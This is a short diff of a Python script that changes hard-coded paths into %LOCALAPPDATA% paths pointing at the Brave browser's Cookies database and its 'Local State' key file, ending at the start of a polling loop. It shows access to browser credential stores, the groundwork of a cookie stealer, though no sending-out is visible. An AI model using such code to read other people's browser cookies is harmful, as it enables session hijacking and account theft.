@@ -1,8 +1,9 @@
+import os
 import sqlite3
 import time
 
-cookies = r"C:\Users\cptbh\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-local_state = r"C:\Users\cptbh\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
+cookies = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+local_state = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State")
 
 while True:
     try:
